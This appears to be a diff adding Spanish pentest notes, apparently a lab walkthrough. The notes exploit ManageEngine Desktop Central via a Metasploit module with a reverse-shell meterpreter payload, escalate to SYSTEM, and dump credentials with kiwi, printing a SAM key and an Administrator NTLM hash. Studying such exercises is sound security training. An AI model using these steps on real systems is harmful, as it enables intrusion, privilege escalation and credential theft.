@@ -1,0 +1,48 @@
+Empezamos a explotar la vulnerabilidad Zohocorp Manageengine Desktop Central   
+abrimos metasploit y hacemos un search: manageengine desktop
+elegimos el exploit windows/http/manageengine_connectionid_write
+Configuramos el local host, rhosts y rports 
+El payload puede que sea necesario cambiar al que viene por defecto(Payload options (windows/meterpreter/reverse_tcp)
+y cambiarlo por Payload options (windows/64x/meterpreter/reverse_tcp)
+Una vez que tenemos la session de meterpreter creada hacemos un getuid para ver que usuario somos
+meterpreter > getuid
+Server username: NT AUTHORITY\LOCAL SERVICE
+
+Ahora tenemos que intentar escalar privilegios para ser usuario SYSTEM
+
+Luego usamos el comando getsystem
+meterpreter > getsystem
+...got system via technique 6 (Named Pipe Impersonation (EFSRPC variant - AKA EfsPotato)).
+
+Usamos el comando load kiwi para cargar el modulo kiwi
+
+Usamos creds_all para obtener credenciales
+usamos lsa_dump_sam para loguearnos como SYSTEM y tener privilegios maximos 
+
+meterpreter > creds_all 
+[!] Not running as SYSTEM, execution may fail
+meterpreter > getsystem
+...got system via technique 6 (Named Pipe Impersonation (EFSRPC variant - AKA EfsPotato)).
+meterpreter > lsa_dump_sam 
+[+] Running as SYSTEM
+[*] Dumping SAM
+Domain : ENIGMA
+SysKey : a31eddb5c825b80b175e7c7fe9d131c9
+Local SID : S-1-5-21-1721945475-4265721450-2952914435
+
+SAMKey : cea5a036451a1b0d372b8bcd61749164
+
+RID  : 000001f4 (500)
+User : Administrator
+  Hash NTLM: 0ad8c247bb2759649193fd181371d0c1
+
+RID  : 000001f5 (501)
+User : Guest
+
+
+meterpreter > creds_kerberos 
+[+] Running as SYSTEM
+[*] Retrieving kerberos credentials
+
+meterpreter > getuid
+Server username: NT AUTHORITY\SYSTEM
